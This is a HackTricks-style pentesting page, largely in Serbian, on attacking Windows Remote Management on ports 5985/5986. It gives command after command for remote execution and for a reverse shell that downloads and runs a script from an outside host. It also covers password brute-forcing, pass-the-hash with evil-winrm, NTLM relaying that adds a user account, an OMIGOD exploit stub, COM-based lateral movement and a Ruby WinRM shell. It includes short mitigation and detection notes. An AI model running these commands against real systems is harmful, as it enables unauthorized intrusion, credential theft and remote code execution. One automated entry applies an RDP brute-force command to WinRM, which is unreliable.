# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>) se ističe kao **protokol od strane Microsoft-a** koji omogućava **daljinsko upravljanje Windows sistemima** putem HTTP(S), koristeći SOAP u tom procesu. Osnovno je pokretan WMI-jem, predstavljajući se kao HTTP-bazirano sučelje za WMI operacije.

Prisutnost WinRM-a na mašini omogućava jednostavno daljinsko upravljanje putem PowerShell-a, slično načinu na koji SSH funkcioniše za druge operativne sisteme. Da bi se utvrdilo da li je WinRM operativan, preporučuje se provera otvaranja specifičnih portova:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

Otvoreni port sa gornje liste označava da je WinRM postavljen, čime se omogućavaju pokušaji započinjanja daljinske sesije.

### **Započinjanje WinRM Sesije**

Da bi se konfigurisao PowerShell za WinRM, Microsoft-ov `Enable-PSRemoting` cmdlet dolazi u igru, postavljajući računar da prihvata daljinske PowerShell komande. Sa povišenim pristupom PowerShell-u, sledeće komande se mogu izvršiti da bi se omogućila ova funkcionalnost i odredio bilo koji host kao pouzdan:
```bash
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Ovaj pristup uključuje dodavanje džokera u `trustedhosts` konfiguraciju, korak koji zahteva pažljivo razmatranje zbog svojih implikacija. Takođe je napomenuto da bi mogla biti neophodna promena tipa mreže sa "Public" na "Work" na napadačevoj mašini.

Pored toga, WinRM se može **aktivirati na daljinu** koristeći `wmic` komandu, što je prikazano na sledeći način:
```bash
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Ova metoda omogućava daljinsko podešavanje WinRM-a, povećavajući fleksibilnost u upravljanju Windows mašinama na daljinu.

### Testirajte da li je konfigurisan

Da biste proverili podešavanje vaše napadačke mašine, koristi se komanda `Test-WSMan` da se proveri da li je cilj pravilno konfigurisan za WinRM. Izvršavanjem ove komande, trebali biste očekivati da dobijete detalje o verziji protokola i wsmid-u, što ukazuje na uspešnu konfiguraciju. Ispod su primeri koji prikazuju očekivani izlaz za konfigurisan cilj u poređenju sa nekonfigurisanim:

- Za cilj koji **je** pravilno konfigurisan, izlaz će izgledati slično ovome:
```bash
Test-WSMan <target-ip>
```
Odgovor bi trebao sadržati informacije o verziji protokola i wsmid, što označava da je WinRM ispravno podešen.

![](<../images/image (582).png>)

- Nasuprot tome, za cilj koji **nije** konfigurisan za WinRM, to bi rezultiralo nedostatkom takvih detaljnih informacija, ističući odsustvo pravilnog WinRM podešavanja.

![](<../images/image (458).png>)

### Izvrši komandu

Da biste izvršili `ipconfig` daljinski na ciljnim mašini i videli njegov izlaz, uradite:
```bash
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../images/image (151).png>)

Možete takođe **izvršiti komandu iz vaše trenutne PS konzole putem** _**Invoke-Command**_. Pretpostavimo da imate lokalno funkciju pod nazivom _**enumeration**_ i želite da je **izvršite na udaljenom računaru**, možete to uraditi:
```bash
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Izvrši skriptu
```bash
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Dobijanje reverzne ljuske
```bash
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Dobijanje PS sesije

Da biste dobili interaktivnu PowerShell ljusku, koristite `Enter-PSSession`:
```bash
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../images/image (1009).png>)

**Sesija će se pokrenuti u novom procesu (wsmprovhost) unutar "žrtve"**

### **Prisiljavanje WinRM-a da se otvori**

Da biste koristili PS Remoting i WinRM, ali ako računar nije konfigurisan, možete ga omogućiti sa:
```bash
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Čuvanje i obnavljanje sesija

Ovo **neće raditi** ako je **jezik** **ograničen** na udaljenom računaru.
```bash
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Unutar ovih sesija možete učitati PS skripte koristeći _Invoke-Command_
```bash
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Greške

Ako pronađete sledeću grešku:

`enter-pssession : Povezivanje sa udaljenim serverom 10.10.10.175 nije uspelo sa sledećom porukom o grešci : WinRM klijent ne može obraditi zahtev. Ako je šema autentifikacije drugačija od Kerberosa, ili ako klijentski računar nije pridružen domeni, tada se mora koristiti HTTPS transport ili odredišna mašina mora biti dodata u TrustedHosts konfiguraciju. Koristite winrm.cmd za konfiguraciju TrustedHosts. Imajte na umu da računari na listi TrustedHosts možda neće biti autentifikovani. Možete dobiti više informacija o tome pokretanjem sledeće komande: winrm help config. Za više informacija, pogledajte temu pomoći about_Remote_Troubleshooting.`

Pokušajte na klijentu (informacije iz [ovde](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
## WinRM veza u linuxu

### Brute Force

Budite oprezni, brute-forcing winrm može blokirati korisnike.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Korišćenje evil-winrm
```ruby
gem install evil-winrm
```
Pročitajte **dokumentaciju** na svom github-u: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Da biste koristili evil-winrm za povezivanje na **IPv6 adresu**, kreirajte unos unutar _**/etc/hosts**_ postavljajući **domen** na IPv6 adresu i povežite se na tu domenu.

### Prosledi hash sa evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../images/image (680).png>)

### Korišćenje PS-docker mašine
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Korišćenje ruby skripte

**Kod preuzet odavde:** [**https://alamot.github.io/winrm_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

- `port:5985 Microsoft-HTTPAPI`

---

## Nedavne ranjivosti i ofanzivne tehnike (2021-2025)

### NTLM relaying direktno na WinRM (WS-MAN)
Od Impacket 0.11 (maj 2023) `ntlmrelayx.py` može da prenese uhvaćene NTLM akreditive direktno na **WS-MAN**/WinRM slušalac. Kada host još uvek sluša na **nešifrovanom HTTP (5985)**, napadač može da kombinuje *mitm6* (ili *Responder*) da bi primorao autentifikaciju i dobio izvršavanje koda na SISTEM nivou:
```bash
sudo ntlmrelayx.py -t wsman://10.0.0.25 --no-smb-server -smb2support \
--command "net user pwned P@ssw0rd! /add"
```
Mitigacije
* Onemogućite HTTP slušaoce – `Set-Item WSMan:\localhost\Service\EnableCompatibilityHttpListener -Value false`
* Prisilite HTTPS i omogućite proširenu zaštitu za autentifikaciju (EPA) na novijim verzijama Windows-a.

### OMIGOD – CVE-2021-38647 (Azure OMI)
Azure Linux agenti koriste **Open Management Infrastructure (OMI)** servis koji izlaže WinRM/WS-MAN API na portovima **5985/5986**. Logička greška je omogućila **neautentifikovani RCE kao root**:
```text
curl http://victim:5985/wsman -H 'Content-Type:text/xml' -d '<xml …/>'
```
Patch or remove OMI (version ≥ 1.6.8-1) and block those ports from the Internet.

### WSMan.Automation COM zloupotreba za lateralno kretanje
WinRM se može koristiti bez PowerShell-a putem `WSMan.Automation` COM objekta – korisno na sistemima u režimu ograničenog jezika. Alati kao što su *SharpWSManWinRM* obavijaju ovu tehniku:
```powershell
$ws = New-Object -ComObject 'WSMan.Automation'
$session = $ws.CreateSession('http://srv01:5985/wsman',0,$null)
$cmdId   = $session.Command('cmd.exe',@('/c','whoami'))
$session.Signal($cmdId,0)
```
Lanac izvršenja (`svchost → wmiprvse → cmd.exe`) je identičan klasičnom PS-Remoting-u.

---

## Ažuriranja alata

* **Evil-WinRM v3.x (2024)** – sada podržava **Kerberos** (`-k` / `--spn`) i **autentifikaciju zasnovanu na sertifikatima** (`--cert-pem`/`--key-pem`), logovanje sesija (`-L`) i mogućnost onemogućavanja završetka udaljenih putanja (`-N`).

```bash
RHOST=10.0.0.25 evil-winrm -i $RHOST -u j.doe -k --spn HTTP/$RHOST
```

* **Python – `pypsrp` 0.9 (2024)** nudi WinRM & PS-Remoting iz Linux-a, uključujući CredSSP i Kerberos:

```python
from psrp.client import Client
c = Client('srv01', username='ACME\\j.doe', ssl=True)
print(c.execute_cmd('ipconfig /all').std_out.decode())
```

* **Detekcija** – pratite **Microsoft-Windows-WinRM/Operational** log:
* Događaj 91 / 163 – shell kreiran
* Događaj 182 – neuspeh autentifikacije
* U logu bezbednosti događaj 4262 beleži izvorni IP (dodato jula 2022. CUs).
Prikupite ih centralno i upozorite na anonimne ili spoljne IP adrese.

---

## Shodan

- `port:5985 Microsoft-HTTPAPI`

## Reference

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/](https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/)
- [https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure](https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure)

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Automatske Komande
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
​

{{#include ../banners/hacktricks-training.md}}
